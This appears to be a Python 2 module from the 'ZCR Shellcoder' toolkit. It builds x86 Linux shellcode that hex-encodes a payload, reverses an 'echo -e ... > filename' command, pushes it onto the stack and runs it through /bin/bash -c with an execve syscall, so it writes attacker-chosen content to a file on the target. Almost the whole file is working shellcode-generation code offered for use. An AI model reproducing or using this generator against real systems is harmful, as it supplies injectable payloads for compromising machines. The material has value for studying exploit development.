#!/usr/bin/env python
'''
ZCR Shellcoder

ZeroDay Cyber Research
Z3r0D4y.Com
Ali Razmjoo
shellcode template used : http://shell-storm.org/shellcode/files/shellcode-57.php
'''
import binascii
def run(filename,content):
	content = binascii.b2a_hex(content.replace('[space]',' '))
	l = len(content) -1
	n = 0
	c = '\\x'
	for word in content:
		c += word
		n+=1
		if n is 2:
			n = 0
			c += '\\x'
	c = c[:-2]
	command = 'echo -e "%s" > %s' %(str(c),str(filename)) 
	print command
	m = len(command) - 1
	stack = ''
	while(m>=0):
			stack += command[m]
			m -= 1
	stack = stack.encode('hex')
	shr_counter = 0 
	shr_counter = len(stack) % 8
	zshr_counter = shr_counter
	shr = None
	if shr_counter is 2:
		shr = '\npop %ecx\nshr    $0x10,%ecx\nshr    $0x8,%ecx\npush %ecx\n'
		stack = stack[0:2] + '909090' + stack[2:]
	if shr_counter is 4:
		shr = '\npop %ecx\nshr    $0x10,%ecx\npush %ecx\n'
		stack = stack[0:4] + '9090' + stack[4:]
	if shr_counter is 6:
		shr = '\npop %ecx\nshr    $0x8,%ecx\npush %ecx\n'
		stack = stack[0:6] + '90' + stack[6:]
	zshr = shr
	m = len(stack)
	n = len(stack) / 8
	file_shellcode = ''
	shr_counter = len(stack) % 8
	if shr_counter is 0:
		shr_n = 0
		r = ''
		while(n is not 0):
			if shr is not None:
				shr_n += 1
				zx = m - 8
				file_shellcode = 'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode 
				m -= 8
				n = n - 1
				shr = None
			if shr is None:
				shr_n += 1
				zx = m - 8
				file_shellcode =  'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode
				m -= 8
				n = n - 1
				
				
		if zshr is None:
			file_z = file_shellcode
		if zshr is not None:
			rep1 = file_shellcode[:16]
			rep2 = rep1 + zshr
			file_z = file_shellcode.replace(rep1,rep2)
	shellcode = '''push   $0xb
pop    %%eax
cltd
push   %%edx
%s
mov    %%esp,%%esi
push   %%edx
push   $0x632d9090
pop    %%ecx
shr    $0x10,%%ecx
push   %%ecx
mov    %%esp,%%ecx
push   %%edx
push   $0x68
push   $0x7361622f
push   $0x6e69622f
mov    %%esp,%%ebx
push   %%edx
push   %%edi
push   %%esi
push   %%ecx
push   %%ebx
mov    %%esp,%%ecx
int    $0x80
'''%(str(file_z))
	return shellcode